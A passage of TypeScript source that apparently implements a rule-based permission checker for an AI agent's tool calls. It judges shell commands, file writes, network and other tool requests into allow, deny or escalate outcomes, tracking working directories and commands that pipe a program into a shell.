    const enclosing = parsed.scopeParents[id];
    const inherited = enclosing === undefined ? startCwd : cwdOf(enclosing);
    cwdByScope.set(id, inherited);
    return inherited;
  };

  let allReadOnly = views.length > 0 && parsed.opaque.length === 0;
  for (const [index, view] of views.entries()) {
    const scope: ShellScope = { context, judgement, cwd: cwdOf(view.command.scope) };
    if (!(await judgeCommand(view, scope, mode))) allReadOnly = false;

    // A shell or `source` reading its program from stdin runs whatever arrives
    // there: a here-string of its own, or what the stage before it prints.
    if (readsProgramFromStdin(view) && mode.nesting < MAX_SCRIPT_NESTING) {
      const inner: Mode = { nesting: mode.nesting + 1, speculative: mode.speculative };
      const feeder = views
        .slice(0, index)
        .filter(earlier => feeds(earlier.command.pipelinePath, view.command.pipelinePath))
        .at(-1);
      const piped = feeder === undefined ? undefined : printedText(feeder);
      const own = SHELL_INTERPRETERS.has(view.command.head) ? [] : view.command.stdin;
      if (feeder !== undefined || own.length > 0) signal(judgement, 'risk.opaque_shell');
      for (const script of [...own, ...(piped === undefined ? [] : [piped])]) {
        await judgeScript(parseShell(script), scope.cwd, context, judgement, inner);
      }
    }
    if (view.command.head === 'cd' || view.command.head === 'pushd') {
      cwdByScope.set(view.command.scope, await changeDirectory(view, scope));
    }
  }
  return allReadOnly;
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

function denied(ruleId: DenyRuleId): RuleOutcome {
  const rule = DENY_RULES[ruleId];
  return { outcome: 'deny', ruleId, reason: rule.reason, alternatives: [...rule.alternatives] };
}

function conclude(judgement: Judgement, allowRule: AllowRuleId, cwdInside: boolean): RuleOutcome {
  if (judgement.deny !== undefined) return denied(judgement.deny);
  const signals = RISK_RULE_IDS.filter(ruleId => judgement.signals.has(ruleId));
  const [strongest] = signals;
  if (strongest === undefined) return { outcome: 'allow', ruleId: allowRule };
  return {
    outcome: 'escalate',
    ruleId: strongest,
    signals,
    targets: [...judgement.targets],
    repoRelative:
      cwdInside && !judgement.unplaced && !judgement.signals.has('risk.cwd_outside_root'),
    reversibleHint: combineHints(judgement.hints),
    facts: { ...judgement.facts },
  };
}

/** Judges one tool call by the fixed rules. No shell is run and nothing is written. */
export interface RuleOptions {
  /**
   * An earlier shell call in the same step changed directory to somewhere
   * outside the write roots and was allowed. A provider with a persistent shell
   * may still be standing there, so the directory this request reports cannot
   * be trusted: a relative path in it is judged as one that cannot be placed.
   */
  cwdUntrusted?: boolean;
}

/** Input fields that name the file an unlisted tool acts on. */
const PATH_FIELDS: readonly string[] = [
  ...['file_path', 'filePath', 'path', 'filename', 'notebook_path', 'target_file', 'destination'],
];
const PATH_LIST_FIELDS: readonly string[] = ['paths', 'files'];

/** The files an unlisted tool names in its input, as far as the usual field names show. */
function inputPaths(input: Record<string, unknown>): string[] {
  const single = PATH_FIELDS.map(field => input[field]).filter(
    (value): value is string => typeof value === 'string' && value !== ''
  );
  const lists = PATH_LIST_FIELDS.flatMap(field => {
    const value = input[field];
    return Array.isArray(value)
      ? value.filter((item): item is string => typeof item === 'string')
      : [];
  });
  return [...single, ...lists];
}

/**
 * A path a file tool was given in a form only that tool can resolve: a leading
 * `~` or `@`, or a URL. The provider is meant to hand over the path the tool
 * will really write; one that still looks like this cannot be placed.
 */
function isUnplaceableForm(path: string): boolean {
  return path.startsWith('~') || path.startsWith('@') || /^[a-z][a-z0-9+.-]*:\/\//i.test(path);
}

/** Tool names of shells this reader does not speak: their text is never taken as understood. */
const FOREIGN_SHELL_TOOL = /powershell|pwsh|(^|[^a-z])cmd([^a-z]|$)|batch/i;

export async function evaluateRules(
  request: ToolActionRequest,
  given: RuleContext,
  options: RuleOptions = {}
): Promise<RuleOutcome> {
  // One evaluation, one view of the filesystem: see `Evaluation`.
  const context: RuleContext = { ...given };
  EVALUATIONS.set(context, { located: new Map(), entries: new Map(), links: new Map() });
  const judgement = newJudgement();
  const input: Record<string, unknown> =
    typeof request.input === 'object' && request.input !== null ? request.input : {};
  const paths = [
    ...(request.paths ?? []),
    // A tool no table lists: whatever its input names as a file is judged as one.
    ...(request.kind === 'other' ? inputPaths(input) : []),
  ];

  if (request.kind === 'mcp') {
    signal(judgement, 'risk.kind_mcp');
    return conclude(judgement, 'default.no_signal', false);
  }

  // Everything below places paths, which needs a working directory it can trust.
  const needsCwd = request.kind === 'shell' || paths.length > 0;
  let cwd: string | undefined;
  let cwdInside = false;
  if (isAbsolute(request.cwd)) {
    const where = await locate(request.cwd, request.cwd, context);
    if (where.kind === 'resolved') {
      cwd = where.real;
      cwdInside = where.inside;
    } else if (needsCwd) {
      return denied('deny.path_unresolvable');
    }
  } else if (needsCwd) {
    return denied('deny.unreadable_request');
  }

  const scope: ShellScope = { context, judgement, cwd };
  for (const path of paths) {
    if (isUnplaceableForm(path)) deny(judgement, 'deny.path_unresolvable');
    else await judgeWriteTarget(plainPath(path), scope);
  }

  switch (request.kind) {
    case 'file_write':
      // The provider could not read every header of a patch: what it writes is unknown.
      if (paths.length === 0 || input.unreadablePatch === true) {
        return denied('deny.unreadable_request');
      }
      return conclude(judgement, 'allow.write_in_root', cwdInside);
    case 'network':
      signal(judgement, 'risk.kind_network');
      if (request.url !== undefined) judgement.targets.add(request.url);
      return conclude(judgement, 'default.no_signal', false);
    case 'other':
      // Nothing is known about what the tool does, so it is never allowed by rule.
      signal(judgement, 'risk.kind_other');
      return conclude(judgement, 'default.no_signal', cwdInside);
    case 'shell': {
      const texts = [request.command, ...(request.parsedCommands ?? [])].filter(
        (text): text is string => typeof text === 'string' && text.trim() !== ''
      );
      if (texts.length === 0) return denied('deny.unreadable_request');
      if (!cwdInside) signal(judgement, 'risk.cwd_outside_root');
      if (FOREIGN_SHELL_TOOL.test(request.toolName)) signal(judgement, 'risk.opaque_shell');
      // A persistent shell may stand somewhere this request does not say.
      judgement.cwdUntrusted = options.cwdUntrusted === true;
      const start = judgement.cwdUntrusted ? undefined : cwd;
      let allReadOnly = true;
      for (const text of texts) {
        if (!(await judgeScript(parseShell(text), start, context, judgement))) allReadOnly = false;
      }
      return conclude(judgement, allReadOnly ? 'allow.read_only' : 'default.no_signal', cwdInside);
    }
    default:
      // A kind this version does not know (a newer provider, a typo): refusing it
      // is recorded and explained, where returning nothing would be neither.
      return denied('deny.unreadable_request');
  }
}
